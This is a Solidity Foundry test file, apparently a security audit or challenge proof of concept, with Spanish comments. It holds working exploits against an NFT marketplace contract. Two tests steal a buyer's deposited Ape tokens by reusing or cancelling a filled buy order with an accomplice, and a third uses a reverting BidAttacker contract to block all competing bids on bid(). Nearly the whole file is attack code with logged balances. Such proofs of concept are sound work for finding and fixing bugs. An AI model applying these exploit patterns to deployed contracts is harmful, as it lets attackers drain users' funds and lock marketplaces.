// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/NFTMarketplace.sol";
import "../src/ApeCoinMock.sol";
import "../src/HalbornNFTMock.sol";

contract NFTMarketplaceTest is Test {
    NFTMarketplace public nftMarketplace;
    ApeCoin public apeCoin;
    HalbornNFT public halbornNFT;

    address governance = makeAddr("governance");
    address user1_victim = address(0x1001);
    address user2_attacker = address(0x1002);
    address user3_accomplice = address(0x1003);

    function setUp() public {
        vm.startPrank(governance);

        apeCoin = new ApeCoin();
        halbornNFT = new HalbornNFT();
        nftMarketplace = new NFTMarketplace(governance, address(apeCoin), address(halbornNFT));

        /// 100 wei para cada uno
        //vm.deal(address(nftMarketplace), 100);
        vm.deal(user1_victim, 100);
        vm.deal(user2_attacker, 100);
        vm.deal(user3_accomplice, 100);

        /// 1000 Ape para cada uno
        apeCoin.mint(user1_victim, 1000);
        apeCoin.mint(user2_attacker, 1000);
        apeCoin.mint(user3_accomplice, 1000);

        /// un nft para cada uno
        halbornNFT.safeMint(user1_victim, 1);
        halbornNFT.safeMint(user2_attacker, 2);
        halbornNFT.safeMint(user3_accomplice, 3);
    }

    /**
    * Si alguien pone una orden de compra por un nft depositando Ape, el propietario del nft puede robar los Ape conservando el nft
    * El problema está al comprobar el estado de la orden de compra en sellToOrderId(), línea 429
    */
    function testAttackSellToOrder() public {
        /// La víctima pone una orden de compra para el nft 2 del atacante (orderId 0)
        vm.startPrank(user1_victim);
        apeCoin.approve(address(nftMarketplace), 1000);
        nftMarketplace.postBuyOrder(2, 100);

        /// El cómplice pone una orden de compra igual (orderId 1)
        vm.startPrank(user3_accomplice);
        apeCoin.approve(address(nftMarketplace), 1000);
        nftMarketplace.postBuyOrder(2, 100);

        /// El atacante vende el nft al cómplice
        vm.startPrank(user2_attacker);
        halbornNFT.approve(address(nftMarketplace), 2);
        nftMarketplace.sellToOrderId(1);

        /// El cómplice devuelve el nft al atacante
        vm.startPrank(user3_accomplice);
        halbornNFT.transferFrom(user3_accomplice, user2_attacker, 2);

        /// El atacante vuelve a vender el nft al cómplice con la misma orden de compra
        /// Esto es posible porque no se comprueba bien el estado de la orden
        vm.startPrank(user2_attacker);
        halbornNFT.approve(address(nftMarketplace), 2);
        nftMarketplace.sellToOrderId(1);

        /// El atacante devuelve los 100 Ape al cómplice
        apeCoin.transfer(user3_accomplice, 100);

        /// El cómplice devuelve el nft al atacante
        vm.startPrank(user3_accomplice);
        halbornNFT.transferFrom(user3_accomplice, user2_attacker, 2);

        console.log("The attacker received the victim's 100 Ape and everyone has his nft");
        console.log("Ape balance user1_victim", apeCoin.balanceOf(user1_victim));
        console.log("Ape balance user2_attacker", apeCoin.balanceOf(user2_attacker));
        console.log("Ape balance user3_accomplice", apeCoin.balanceOf(user3_accomplice));
        console.log("nft1 owner", halbornNFT.ownerOf(1));
        console.log("nft2 owner", halbornNFT.ownerOf(2));
        console.log("nft3 owner", halbornNFT.ownerOf(3));
    }

    /**
    * Mismo ataque que el anterior, si alguien pone una orden de compra por un nft depositando Ape, el propietario del nft puede robar los Ape conservando el nft
    * El problema está al comprobar el estado de la orden de compra en cancelBuyOrder(), línea 209
    */
    function testAttackCancelBuyOrder() public {
        /// La víctima pone una orden de compra para el nft 2 del atacante (orderId 0)
        vm.startPrank(user1_victim);
        apeCoin.approve(address(nftMarketplace), 1000);
        nftMarketplace.postBuyOrder(2, 100);

        /// El cómplice pone una orden de compra igual (orderId 1)
        vm.startPrank(user3_accomplice);
        apeCoin.approve(address(nftMarketplace), 1000);
        nftMarketplace.postBuyOrder(2, 100);

        /// El atacante vende el nft al cómplice
        vm.startPrank(user2_attacker);
        halbornNFT.approve(address(nftMarketplace), 2);
        nftMarketplace.sellToOrderId(1);

        /// El cómplice cancela su orden y recupera sus Ape
        /// Esto es posible porque no se comprueba bien el estado de la orden
        vm.startPrank(user3_accomplice);
        nftMarketplace.cancelBuyOrder(1);

        /// El cómplice devuelve el nft al atacante
        halbornNFT.transferFrom(user3_accomplice, user2_attacker, 2);

        console.log("The attacker received the victim's 100 Ape and everyone has his nft");
        console.log("Ape balance user1_victim", apeCoin.balanceOf(user1_victim));
        console.log("Ape balance user2_attacker", apeCoin.balanceOf(user2_attacker));
        console.log("Ape balance user3_accomplice", apeCoin.balanceOf(user3_accomplice));
        console.log("nft1 owner", halbornNFT.ownerOf(1));
        console.log("nft2 owner", halbornNFT.ownerOf(2));
        console.log("nft3 owner", halbornNFT.ownerOf(3));
    }

    /**
    * Ataque DOS contra la función bid()
    */
    function testBidDOS() public {
        /// El atacante crea una puja por el nft 1 a través de un contrato malicioso
        vm.startPrank(user2_attacker);
        BidAttacker bidAttacker = new BidAttacker(address(nftMarketplace));
        bidAttacker.bid{value: 1}(1);
        bidAttacker.bid{value: 1}(2);
        bidAttacker.bid{value: 1}(3);

        /// Los demás usuarios ya no pueden pujar
        vm.startPrank(user3_accomplice);
        vm.expectRevert();
        nftMarketplace.bid{value: 20}(1);
        vm.expectRevert();
        nftMarketplace.bid{value: 20}(2);
        vm.expectRevert();
        nftMarketplace.bid{value: 20}(3);

        console.log("The attacker has bid 1 wei for each NFT and no one else can bid");

        /// Los propietarios de los nfts sólo pueden aceptar la puja del atacante
        vm.startPrank(user1_victim);
        halbornNFT.approve(address(nftMarketplace), 1);
        nftMarketplace.acceptBid(1);

        console.log("The owners of the nfts can only accept the attacker's bid");
    }
}

/// Contrato auxiliar para impedir pujas sucesivas
contract BidAttacker is IERC721Receiver {

    address immutable nftMarketplace;

    constructor(address _nftMarketplace) {
        nftMarketplace = _nftMarketplace;
    }

    /// Realizamos la puja
    function bid(uint256 nftId) public payable {
        NFTMarketplace(nftMarketplace).bid{value: msg.value}(nftId);
    }

    /// Bloqueamos las transferencias para no permitir más pujas
    receive() external payable {
        revert();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes memory data
    ) public override returns (bytes4) {
        //emit ERC721Received(operator, from, tokenId, data, gasleft());
        return IERC721Receiver.onERC721Received.selector;
    }
}